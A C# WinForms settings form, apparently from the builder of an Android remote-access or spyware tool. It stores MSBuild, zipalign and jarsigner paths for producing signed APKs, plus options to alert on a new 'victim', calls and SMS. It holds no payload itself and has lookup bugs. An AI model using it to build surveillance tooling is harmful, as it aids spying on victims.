using System;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Xml.Linq;

namespace SV
{
    public partial class Settings : MetroFramework.Forms.MetroForm
    {
        public Settings()
        {
            InitializeComponent();
            checkBox1.Checked = dosyaYollari("notify_victim") != "..." ? true : false;
            checkBox2.Checked = dosyaYollari("notify_call") != "..." ? true : false;
            checkBox3.Checked = dosyaYollari("notify_sms") != "..." ? true : false;
            label1.Text = dosyaYollari("msbuild").Length > 40 ? label1.Text = dosyaYollari("msbuild").Substring(0, 30) + "..." : dosyaYollari("msbuild");
            label2.Text = dosyaYollari("zip").Length > 40 ? label2.Text = dosyaYollari("zip").Substring(0, 30) + "..." : dosyaYollari("zip");
            label3.Text = dosyaYollari("jarsigner").Length > 40 ? label3.Text = dosyaYollari("jarsigner").Substring(0, 30) + "..." : dosyaYollari("jarsigner");
            msbuild = dosyaYollari("msbuild");
            jarsigner = dosyaYollari("jarsigner");
            zipalign = dosyaYollari("zip");
            button2.Click += button2_Click;
            button3.Click += button3_Click;
            button4.Click += button4_Click;
            button1.Click += button1_Click;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            stringValueleriYaz();
            Close();
        }
        public static string dosyaYollari(string input)
        {
            XDocument xmlFile = XDocument.Load(Environment.CurrentDirectory + @"\settings.xml");
            XElement mnfst = xmlFile.Elements("resources").First();
            foreach (var t in mnfst.Elements())
            {
                if (input == "zip")
                {
                    if (t.Attribute("name").Value == "zipalign")
                    {
                        return t.Value;
                    }
                }
                if (input == "msbuild")
                {
                    if (t.Attribute("name").Value == "msbuild")
                    {
                        return t.Value;
                    }
                }
                if (input == "jarsigner")
                {
                    if (t.Attribute("name").Value == "jarsigner")
                    {
                        return t.Value;
                    }
                }
                if (input == "notify_victim")
                {
                    if (t.Attribute("name").Value == "notify_victim")
                    {
                        return t.Value;
                    }
                }
                if (input == "notify_sms")
                {
                    if (t.Attribute("name").Value == "notify_sms")
                    {
                        return t.Value;
                    }
                }
                if (input == "notify_call")
                {
                    if (t.Attribute("name").Value == "notify_sms")
                    {
                        return t.Value;
                    }
                }
            }
            return null;
        }
        string msbuild= "...", zipalign= "...", jarsigner="...";

        private void button3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            { Multiselect = false, Filter = "Zipalign.exe|*.exe", Title = "Select Zipalign path" })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    zipalign = op.FileName;
                    label2.Text = op.FileName.Length > 40 ? label2.Text = op.FileName.Substring(0, 30) + "..." : op.FileName;
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            { Multiselect = false, Filter = "Jarsigner.exe|*.exe", Title = "Select Jarsigner path" })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    jarsigner = op.FileName;
                    label3.Text = op.FileName.Length > 40 ? label3.Text = op.FileName.Substring(0, 30) + "..." : op.FileName;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog op = new OpenFileDialog() 
            { Multiselect = false, Filter = "MSBuild.exe|*.exe", Title = "Select MSBuild path" })
            {
                if(op.ShowDialog() == DialogResult.OK)
                {
                    msbuild = op.FileName;
                    label1.Text = op.FileName.Length > 40 ? label1.Text = op.FileName.Substring(0, 30) + "..." : op.FileName;
                }
            }
        }

        private void stringValueleriYaz()
        {
            XDocument xmlFile = XDocument.Load(Environment.CurrentDirectory + @"\settings.xml");
            XElement mnfst = xmlFile.Elements("resources").First();
            foreach (var t in mnfst.Elements())
            {
                switch (t.Attribute("name").Value)
                {
                    case "msbuild":
                        t.Value = msbuild;
                        break;
                    case "zipalign":
                        t.Value = zipalign;
                        break;
                    case "jarsigner":
                        t.Value = jarsigner;
                        break;
                    case "notify_victim":
                        t.Value = checkBox1.Checked ? Environment.CurrentDirectory + "\\sound.wav" : "...";
                        break;
                    case "notify_call":
                        t.Value = checkBox2.Checked ? "1" : "0";
                        break;
                    case "notify_sms":
                        t.Value = checkBox3.Checked ? "1" : "0";
                        break;
                }
            }
            xmlFile.Save(Environment.CurrentDirectory + @"\settings.xml");
        }
    }
}
